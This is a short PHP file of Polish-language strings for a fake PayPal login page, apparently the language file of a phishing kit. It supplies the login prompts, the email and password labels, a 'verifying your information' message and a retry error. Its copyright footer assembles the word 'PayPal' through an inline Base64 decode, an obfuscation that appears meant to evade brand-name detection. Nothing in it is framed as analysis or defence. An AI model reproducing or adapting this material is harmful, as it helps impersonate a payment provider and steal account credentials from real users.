<?php
$Z118_01 = "Zaloguj się do swojego konta PayPal";
$Z118_02 = "Adres e-mail";
$Z118_03 = "Hasło";
$Z118_04 = "Wymagane";
$Z118_05 = "Wymagane";
$Z118_06 = "Zaloguj się";
$Z118_07 = "Nie pamiętasz swojego adresu e-mail albo hasła?";
$Z118_08 = "Utwórz konto";
$Z118_09 = "Ochrona danych";
$Z118_10 = "PayPal";
$Z118_11 = "Copyright © 1999-<script>document.write(new Date().getFullYear());</script> <script>document.write(Base64.decode('UGF5UGFs'));</script>. Wszelkie prawa zastrzeżone.";
$Z118_12 = "Trwa weryfikacja podanych informacji…";
$Z118_13 = "Sprawdź wprowadzone informacje i spróbuj ponownie.";
?>
